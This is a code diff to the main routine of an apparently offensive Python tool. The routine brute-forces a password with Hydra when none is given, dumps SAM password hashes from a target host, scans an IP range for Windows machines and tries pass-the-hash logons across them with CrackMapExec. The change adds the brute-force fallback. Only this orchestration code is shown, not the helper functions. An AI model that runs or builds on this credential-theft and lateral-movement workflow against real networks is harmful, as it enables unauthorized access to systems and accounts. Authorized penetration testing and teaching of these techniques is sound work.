@@ -181,12 +181,17 @@ def main():
         print('Ensure listed programs are in your path before running')
         return 1
 
-    sam_hashes = samGrab(args.ip_address, args.username, args.password)
+    password = args.password or hydraPass(args.ip_address, args.username, args.dictionary)
+
+    sam_hashes = samGrab(args.ip_address, args.username, password)
     print('Hashes acquired')
+
     ip_addrs = osFingerprint(args.ip_range)
     print('Windows boxes located')
+
     formatted_sam_hashes = formatCrackmapSam(sam_hashes)
     print('Hashes formatted')
+
     result_dict = attemptLogon(formatted_sam_hashes, ip_addrs)
     pprint(result_dict)
 
